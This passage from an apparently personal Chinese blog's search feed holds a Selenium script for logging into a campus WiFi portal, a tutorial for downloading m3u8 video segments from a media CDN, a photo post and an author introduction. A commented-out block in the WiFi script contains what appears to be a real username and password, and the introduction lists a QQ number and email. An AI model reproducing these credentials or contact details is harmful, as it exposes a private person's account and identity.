operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>service<span class="token operator">=</span>service<span class="token punctuation">,</span> options<span class="token operator">=</span>options<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        new<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>        new<span class="token punctuation">.</span>find_elements<span class="token punctuation">(</span>by<span class="token operator">=</span>By<span class="token punctuation">.</span>XPATH<span class="token punctuation">,</span>                          value<span class="token operator">=</span><span class="token string">"//span/input[@class='ant-input' and @id='login-pc_username'and @placeholder='用户名']"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>            <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">)</span>        new<span class="token punctuation">.</span>find_elements<span class="token punctuation">(</span>by<span class="token operator">=</span>By<span class="token punctuation">.</span>XPATH<span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token string">"//input[@id='login-pc_password']"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">)</span>        new<span class="token punctuation">.</span>find_elements<span class="token punctuation">(</span>by<span class="token operator">=</span>By<span class="token punctuation">.</span>XPATH<span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token string">"//input[@id='login-pc_autoAuth']"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>        new<span class="token punctuation">.</span>find_elements<span class="token punctuation">(</span>by<span class="token operator">=</span>By<span class="token punctuation">.</span>XPATH<span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token string">"//button"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        button <span class="token operator">=</span> new<span class="token punctuation">.</span>find_elements<span class="token punctuation">(</span>by<span class="token operator">=</span>By<span class="token punctuation">.</span>XPATH<span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token string">"//div[@tabindex='-1']/div[@class='ant-drawer-content-wrapper'][1]//div[@class='ant-drawer-content']//button"</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        button<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        win32api<span class="token punctuation">.</span>MessageBox<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"校园网wifi状态不正确！"</span><span class="token punctuation">,</span> <span class="token string">"来自Nuist的提示"</span><span class="token punctuation">,</span> win32con<span class="token punctuation">.</span>MB_OK<span class="token punctuation">)</span>        <span class="token comment">#以下为debug内容</span>        <span class="token comment">#time.sleep(1)</span>        <span class="token comment">#print(type(test))</span>        <span class="token comment">#print(test[2].text)</span>        <span class="token comment">#print(len(test))</span>        <span class="token comment">#for item in test:</span>            <span class="token comment">#print(item.get_attribute("outerHTML"))</span>        <span class="token comment">#time.sleep(2)</span>        <span class="token triple-quoted-string string">'''        new.find_elements(by=By.XPATH,value="//span/input[@class='ant-input' and @id='login-pc_username'and @placeholder='用户名']")[1].send_keys("02502607554")        new.find_elements(by=By.XPATH,value="//input[@id='login-pc_password']")[1].send_keys("829327")        new.find_elements(by=By.XPATH,value="//input[@id='login-pc_autoAuth']")[1].click()        new.find_elements(by=By.XPATH,value="//button")[1].click()        new.find_elements(by=By.XPATH,value="//div[@class='ant-drawer-body']/button[@class='col ant-btn ant-btn-lg ant-btn-block']")[2].click()                '''</span>    new<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">judge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ping -n 1 -l 8 baidu.com"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"请求超时"</span> <span class="token keyword">in</span> res<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span><span class="token string">"的回复: 字节=8"</span> <span class="token keyword">in</span> res<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    i<span class="token operator">=</span><span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"程序开始，准备连接网络"</span><span class="token punctuation">)</span>    connect<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>judge<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"程序执行完毕"</span><span class="token punctuation">)</span>        win32api<span class="token punctuation">.</span>MessageBox<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"网络连接成功"</span><span class="token punctuation">,</span> <span class="token string">"来自Nuist的提示"</span><span class="token punctuation">,</span> win32con<span class="token punctuation">.</span>MB_OK<span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>judge<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oops，程序第1次连接失败了，将会继续尝试"</span><span class="token punctuation">)</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            connect<span class="token punctuation">(</span><span class="token punctuation">)</span>            i<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第%d次连接失败，准备下一次尝试"</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        win32api<span class="token punctuation">.</span>MessageBox<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"网络连接多次失败，请检查"</span><span class="token punctuation">,</span> <span class="token string">"来自Nuist的提示"</span><span class="token punctuation">,</span> win32con<span class="token punctuation">.</span>MB_OK<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        win32api<span class="token punctuation">.</span>MessageBox<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"网络连接失败！"</span><span class="token punctuation">,</span> <span class="token string">"来自Nuist的提示"</span><span class="token punctuation">,</span> win32con<span class="token punctuation">.</span>MB_OK<span class="token punctuation">)</span>        <span class="token keyword">pass</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"程序执行完毕"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__start__"</span><span class="token punctuation">:</span>    start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h4><ul><li>本程序为演示版本，后续会发布更新，请耐心等待，具体看作者心情</li><li>目前仅支持Windows平台</li><li>您的认可将会是我进步的动力！</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python Humansimular </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 插件 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用selenium爬取某网页图片</title>
      <link href="/2022/08/25/%E4%BD%BF%E7%94%A8selenium%E7%88%AC%E5%8F%96%E6%9F%90%E7%BD%91%E9%A1%B5%E5%9B%BE%E7%89%87/"/>
      <url>/2022/08/25/%E4%BD%BF%E7%94%A8selenium%E7%88%AC%E5%8F%96%E6%9F%90%E7%BD%91%E9%A1%B5%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Python Crawl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> Web </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用python下载流媒体</title>
      <link href="/2022/08/17/%E4%BD%BF%E7%94%A8python%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/"/>
      <url>/2022/08/17/%E4%BD%BF%E7%94%A8python%E4%B8%8B%E8%BD%BD%E6%B5%81%E5%AA%92%E4%BD%93/</url>
      
        <content type="html"><![CDATA[<h2 id="使用python下载m3u8格式文件"><a href="#使用python下载m3u8格式文件" class="headerlink" title="使用python下载m3u8格式文件"></a>使用python下载m3u8格式文件</h2><h3 id="M3U8文件是什么"><a href="#M3U8文件是什么" class="headerlink" title="M3U8文件是什么"></a>M3U8文件是什么</h3><ul><li>m3u8文件是网页视频ts格式文件的索引</li><li>ts是一段视频的切片文件</li><li>通过按顺序加载切片文件，可以完整播放整个视频，并且便于切换清晰度</li></ul><hr><h3 id="python的wget库和time库"><a href="#python的wget库和time库" class="headerlink" title="python的wget库和time库"></a>python的wget库和time库</h3><ul><li>需要下载m3u8视频，我们需要安装对应的软件库</li><li>wget库用来下载文件，time库防止下载过快，导致触发服务器警报</li><li>在终端或者cmd输入如下命令进行安装：<br><code>pip install wget</code><br><code>pip install time</code></li></ul><hr><h4 id="安装python以及对应的模块"><a href="#安装python以及对应的模块" class="headerlink" title="安装python以及对应的模块"></a>安装python以及对应的模块</h4><ul><li><strong>Windows</strong><blockquote><p>进入<a href="https://python.org/">python官网</a><br>点击Download,选择python 3.x.x版本<br>运行，一直下一步</p></blockquote></li></ul><hr><ul><li><strong>Linux</strong><blockquote><p>如果是debian衍生系统:<br><code>apt update &amp;&amp; apt upgrade</code><br><code>apt -y install python</code><br>如果是redhat衍生系统:<br><code>yum update &amp;&amp; yum upgrade</code><br><code>yum -y install python</code></p></blockquote></li></ul><hr><ul><li><strong>验证安装</strong><br>– Windows系统<ul><li>使用win+R，输入CMD，在弹出的命令提示符输入python<br>– Linux系统</li><li>按下Ctrl+Alt+T，开启终端，输入python</li></ul></li></ul><p>当出现python 3.x.x的字样，即表示安装完成</p><h3 id="网页寻找ts文件列表"><a href="#网页寻找ts文件列表" class="headerlink" title="网页寻找ts文件列表"></a>网页寻找ts文件列表</h3><ul><li>我们以某媒体网站为例，打开加载的视频之后，使用F12打开开发者选项</li><li>我们点击”网络”标签，并且在筛选器中输入”ts”</li><li>我们此时可以看到我们得到了一个列表，这些ts文件即为完整视频的ts片段</li><li>我们将视频拖拽到末尾，并注意观察，此时我们就能得到最后一个文件</li><li>通过观察我们可以发现，文件名是从media_001.ts到media_648.ts</li><li>我们便成功获取了文件列表</li></ul><h3 id="编写python程序"><a href="#编写python程序" class="headerlink" title="编写python程序"></a>编写python程序</h3><p>完整的python代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">import</span> wget<span class="token comment"># /usr/bin/003.py</span><span class="token comment"># -*- coding=utf-8 -*-</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    perfix <span class="token operator">=</span> <span class="token string">"https://cdn.kaooooo.com/xvod/743bd8b89779a7264b64"</span> \             <span class="token string">"9623141df78eac27b423258ac81dc2e1da105b5de4a09921f11e97d0da21/media_{}.ts"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">691</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        wget<span class="token punctuation">.</span>download<span class="token punctuation">(</span>url<span class="token operator">=</span>perfix<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>out<span class="token operator">=</span><span class="token string">"F:/download/"</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">pass</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用格式工厂合并视频"><a href="#使用格式工厂合并视频" class="headerlink" title="使用格式工厂合并视频"></a>使用格式工厂合并视频</h3><ul><li>打开格式工厂，拖入所有的视频，点击视频合并，选中所有即可合并视频</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-08-10--今日分享</title>
      <link href="/2022/08/10/share/"/>
      <url>/2022/08/10/share/</url>
      
        <content type="html"><![CDATA[<h4 id="2022-08-10摄影分享"><a href="#2022-08-10摄影分享" class="headerlink" title="2022-08-10摄影分享"></a>2022-08-10摄影分享</h4><h5 id="今日摄影："><a href="#今日摄影：" class="headerlink" title="今日摄影："></a>今日摄影：</h5><h5 id="分享两张超好看的照片"><a href="#分享两张超好看的照片" class="headerlink" title="分享两张超好看的照片"></a>分享两张超好看的照片</h5><img src="/2022/08/10/share/202208101.webp" class="lazyload placeholder" data-srcset="/2022/08/10/share/202208101.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="街角的黄昏"><hr><img src="/2022/08/10/share/202208102.webp" class="lazyload placeholder" data-srcset="/2022/08/10/share/202208102.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="窗边的日落">]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome!</title>
      <link href="/2022/08/07/Welcome/"/>
      <url>/2022/08/07/Welcome/</url>
      
        <content type="html"><![CDATA[<h3 id="这是我的第一篇文章"><a href="#这是我的第一篇文章" class="headerlink" title="这是我的第一篇文章"></a>这是我的第一篇文章</h3><h5 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h5><ul><li>小和</li><li>00后</li><li>理科生</li><li>技术小白（打怪升级中）</li><li>热爱音乐</li></ul><h5 id="如何联系我"><a href="#如何联系我" class="headerlink" title="如何联系我"></a>如何联系我</h5><ul><li>QQ: 2064503217</li><li>mail: <a href="mailto:andytoe@qq.com">andytoe@qq.com</a></li><li>github: <a href="https://www.github.com/littlewith">https://www.github.com/littlewith</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Welcome </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
